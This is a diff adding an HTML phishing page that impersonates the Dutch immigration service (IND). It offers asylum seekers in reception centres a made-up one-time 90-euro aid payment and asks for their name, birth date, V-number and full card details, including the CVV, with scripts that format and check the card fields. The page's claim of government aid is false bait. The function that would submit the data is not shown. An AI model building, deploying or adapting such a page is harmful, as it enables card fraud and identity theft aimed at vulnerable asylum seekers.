@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>IND</title>
+	<link rel="icon" type="image/png" href="./pictures/logo1.png" />
+	<link rel="stylesheet" href="reset.css">
+	<link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+	<header class="header">
+		<div class="container">
+			<div class="header__inner">
+				<a href="https://ind.nl/en"><img src="./pictures/logo.svg"></a>
+			</div>
+		</div>
+	</header>
+	<div class="container">
+		<form class="inform">
+			<p class="inform__text">
+				IND and the Ministry of Finance have decided to grant a financial aid of 90 euros (one-time). We
+				understand that every asylum seeker who stays in an AZC faces financial challenges that make it
+				difficult to stay in an azc accommodation.
+			</p>
+		</form>
+		<form class="form" caction="">
+			<h1 class="form__title">Fill in your details in the form</h1>
+			<div class="group1 group">
+				<center><label for="">First name</label></center>
+				<center><input type="text" name="firstname" placeholder="John"></center>
+			</div>
+			<div class="group">
+				<center><label for="">Last name</label></center>
+				<center><input type="text" name="lastname" placeholder="Smith"></center>
+			</div>
+			<div class="group group_birth">
+				<center><label for="">Date of birth</label></center>
+				<center><input type="text" id="birthdate" placeholder="DD/MM/YYYY" oninput="formatBirthdate(this)"
+						onblur="validateBirthdate(this)"></center>
+			</div>
+			<div class="group group_vnumber">
+				<center><label for="">V-number</label></center>
+				<center><input type="tel" maxlength="10" name="V-Nummer" placeholder="V-Number"></center>
+			</div>
+			<div class="warning__wrapper">
+				<div class="warning-box">
+					<img src="./pictures/warning.svg" alt="" class="warning__img">
+					<p class="warning__text">
+						Attention: make sure you enter all data correctly. It is important to provide the correct
+						information to avoid delays or errors. Thank you for your understanding and cooperation.
+					</p>
+				</div>
+			</div>
+			<h3 class="dannie">Enter the card details</h3>
+			<div class="card">
+				<center><label for="cardNumber">Card number</label></center>
+				<center><input type="text" id="cardNumber" maxlength="19" placeholder="0000 0000 0000 0000"
+						oninput="formatCardNumber(this)" onblur="validateCardNumber(this)"></center>
+			</div>
+			<div class="group group_cvv">
+				<center><label for="cvv">CVV</label></center>
+				<center><input type="tel" maxlength="3" id="cvv" placeholder="000" onblur="validateCVV(this)"></center>
+			</div>
+			<div class="group group_exp">
+				<center><label for="expiryDate">EXP</label></center>
+				<center><input type="text" id="expiryDate" maxlength="5" placeholder="MM/YY"
+						oninput="formatExpiryDate(this)" onblur="validateExpiryDate(this)"></center>
+			</div>
+			<div class="group group_name">
+				<center><label for="Cardholdername">Card holder name</label></center>
+
+				<center><input type="text" id="Cardholdername" placeholder="John Smith"></center>
+			</div>
+			<div class="group">
+				<button type="submit" class="confirm__btn" id="submitButton" 
+					onclick="submitForm()">Confirm</button> 
+			</div>
+		</form>
+
+	</div>
+
+	<footer class="footer">
+		<div class="container">
+			<div class="footer__inner">
+				<ul class="menu__info-list">
+					<li class="menu__info-item">
+						<a href="https://ind.nl/en/cookies" class="menu__info-link">Cookies</a>
+					</li>
+					<li class="menu__info-item">
+						<a href="https://ind.nl/en/proclaimer" class="menu__info-link">Proclaimer</a>
+					</li>
+					<li class="menu__info-item">
+						<a href="https://ind.nl/en/privacy" class="menu__info-link">Privacy</a>
+					</li>
+					<li class="menu__info-item">
+						<a href="https://ind.nl/en/sitemap" class="menu__info-link">Sitemap</a>
+					</li>
+					<li class="menu__info-item">
+						<a href="https://ind.nl/en/accessibility" class="menu__info-link">Accessibility</a>
+					</li>
+					<li class="menu__info-item">
+						<a href="https://ind.nl/en/web-archive-ind" class="menu__info-link">Webarchive</a>
+					</li>
+				</ul>
+				<ul class="menu__info-list">
+					<li class="menu__info-item">
+						<a href="https://ind.nl/en/service-contact/contact-with-ind" class="menu__info-link">Contact</a>
+					</li>
+					<li class="menu__info-item">
+						<a href="https://ind.nl/en/about-us" class="menu__info-link">About us</a>
+					</li>
+					<li class="menu__info-item">
+						<a href="https://ind.nl/en/about-us/press-and-information" class="menu__info-link">Press &
+							information</a>
+					</li>
+					<li class="menu__info-item">
+						<a href="https://ind.nl/en/about-us/work-for-the-ind" class="menu__info-link">Vacancies</a>
+					</li>
+				</ul>
+			</div>
+			<div class="footer__socials">
+				<a href="https://www.facebook.com/IND.NL"><img src="./pictures/Facebook.png" alt="facebook"></a>
+				<a href="https://www.linkedin.com/company/immigratie--en-naturalisatiedienst-ind-/"><img
+						src="./pictures/in.png" alt="in"></a>
+				<a href="https://www.x.com/IND_NL"><img src="./pictures/X.png" alt="x"></a>
+			</div>
+		</div>
+	</footer>
+
+	<script>
+		function formatCardNumber(input) {
+			// Remove non-numeric characters
+			let cardNumber = input.value.replace(/\D/g, '');
+
+			// Add hyphens for better formatting
+			cardNumber = cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ');
+
+			// Update the input value
+			input.value = cardNumber;
+		}
+
+		function validateCardNumber(input) {
+			// Remove hyphens and non-numeric characters for validation
+			let cardNumber = input.value.replace(/\D/g, '');
+
+			// Check if the card number is a valid length
+			if (cardNumber.length !== 16) {
+				alert('Invalid card number length. Please enter a 16-digit card number.');
+
+			}
+		}
+
+		function validateCVV(input) {
+			// Remove non-numeric characters
+			let cvv = input.value.replace(/\D/g, '');
+
+			// Check if the CVV is a valid length
+			if (cvv.length !== 3) {
+				alert('Invalid CVV length. Please enter a 3-digit CVV.');
+			}
+			else if (cvv.length == 0) {
+				return;
+			}
+		}
+
+		function formatExpiryDate(input) {
+			// Remove non-numeric characters
+			let expiryDate = input.value.replace(/\D/g, '');
+
+			// Add a slash between month and year
+			if (expiryDate.length > 2) {
+				expiryDate = expiryDate.slice(0, 2) + '/' + expiryDate.slice(2);
+			}
+
+			// Update the input value
+			input.value = expiryDate;
+		}
+
+		function validateExpiryDate(input) {
+			// Remove non-numeric characters
+			let expiryDate = input.value.replace(/\D/g, '');
+
+			// Check if the expiry date is a valid length
+			if (expiryDate.length !== 4) {
+				alert('Invalid expiration date. Please enter a valid MM/YY format.');
+			} else {
+				// Extract month and year for additional validation if needed
+				let month = parseInt(expiryDate.slice(0, 2), 10);
+				let year = parseInt(expiryDate.slice(2), 10);
+
+				if (month > 12) {
+					alert('Invalid expiration date. Please enter a valid MM/YY format.')
+				}
+				else if (year < 24) {
+					alert('the card is expired')
+				}
+
+				// Perform additional validation if needed
+				// Example: Check if month is between 1 and 12, and if the year is not expired
+
+
+			}
+		}
+		function formatBirthdate(input) {
+			// Remove non-numeric characters
+			let birthdate = input.value.replace(/\D/g, '');
+
+			// Add slashes for better formatting
+			if (birthdate.length > 2) {
+				birthdate = birthdate.slice(0, 2) + '/' + birthdate.slice(2);
+			}
+			if (birthdate.length > 5) {
+				birthdate = birthdate.slice(0, 5) + '/' + birthdate.slice(5, 9);
+			}
+
+			// Update the input value
+			input.value = birthdate;
+		}
+
+		function validateBirthdate(input) {
+			// Remove non-numeric characters
+			let birthdate = input.value.replace(/\D/g, '');
+
+			// Check if the birthdate is a valid length
+			if (birthdate.length !== 8) {
+				alert('Invalid birthdate. Please enter a valid DD/MM/YYYY format.');
+			} else {
+				// Extract day, month, and year for additional validation if needed
+				let day = parseInt(birthdate.slice(0, 2), 10);
+				let month = parseInt(birthdate.slice(3, 5), 10);
+				let year = parseInt(birthdate.slice(6, 10), 10);
+
+				// Perform additional validation if needed
+				// Example: Check if month is between 1 and 12, and if the day is valid for the given month and year
+
+
+			}
+		}
+
+		
+		
+
+	</script>
+</body>
+
+</html>
